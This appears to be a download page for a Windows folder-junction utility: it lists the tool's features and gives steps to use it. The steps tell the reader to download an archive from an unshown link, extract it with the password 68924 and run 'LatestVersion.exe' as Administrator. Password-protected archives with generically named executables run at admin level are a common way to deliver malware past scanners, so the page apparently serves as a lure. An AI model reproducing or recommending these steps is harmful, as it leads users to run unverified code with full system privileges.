## What This Tool Does

- Create junction folders to redirect folders to different locations
- Delete existing junctions
- View all junction folders on your system
- Check if a junction is valid or broken
- Works with any folder on any drive
- Works on Windows 10 and 11

---

## How to Use

1. Download the archive from the link above
2. Extract with password 68924
3. Right-click LatestVersion.exe and select Run as Administrator
4. Select the source folder (where the junction will appear)
5. Select the target folder (where the data is actually stored)
6. Click Create Junction - the folder is redirected instantly
